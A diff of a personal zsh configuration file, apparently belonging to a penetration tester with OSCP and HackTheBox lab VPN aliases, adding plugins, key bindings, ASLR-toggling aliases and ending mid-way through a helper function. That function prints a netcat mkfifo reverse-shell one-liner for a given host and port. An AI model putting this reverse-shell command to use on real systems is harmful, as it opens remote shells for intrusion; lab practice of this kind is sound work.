@@ -18,7 +18,7 @@ CASE_SENSITIVE="true"
 # Custom plugins may be added to ~/.oh-my-zsh/custom/plugins/
 # Example format: plugins=(rails git textmate ruby lighthouse)
 # Add wisely, as too many plugins slow down shell startup.
-plugins=(git)
+plugins=(git zsh-autosuggestions zsh-syntax-highlighting zsh-history-substring-search)
 
 source $ZSH/oh-my-zsh.sh
 
@@ -53,23 +53,12 @@ _comp_options+=(globdots)		# Include hidden files.
 # apt regex expansion
 unsetopt no_match
 
-# PATH
-
-if [ -d "$HOME/bin" ] ; then
-    PATH="$HOME/bin:$PATH"
-fi
-
-if [ -d "$HOME/scripts" ] ; then
-    PATH="$HOME/scripts:$PATH"
-fi
-
-if [ -d "$HOME/.gocode/bin" ] ; then
-    PATH="$HOME/.gocode/bin:$PATH"
-fi
-
-
 # Speed up disown
 setopt AUTO_CONTINUE
+
+# substring search binding
+bindkey '\e[A' history-substring-search-up
+bindkey '\e[B' history-substring-search-down
 
 # vi mode
 bindkey -v
@@ -128,6 +117,11 @@ alias oscplab='sudo openvpn --config ~/oscp/lab/OS-89708-PWK.ovpn --auth-user-pa
 alias oscpexam='sudo openvpn --config ~/oscp/exam/OS-89708-PWK.ovpn --auth-user-pass ~/oscp/lab/auth.txt'
 alias htblab='sudo openvpn --config ~/htb/lab_alvarontwrk.ovpn'
 alias academylab='sudo openvpn --config ~/htb/academy.ovpn'
+alias prun='poetry run'
+alias disable-aslr='echo 0 | sudo tee /proc/sys/kernel/randomize_va_space'
+alias enable-aslr='echo 1 | sudo tee /proc/sys/kernel/randomize_va_space'
+alias pipxg='sudo PIPX_HOME=/opt/pipx PIPX_BIN_DIR=/usr/local/bin pipx'
+
 
 rs-mkfifo() {
   echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $1 $2 >/tmp/f"
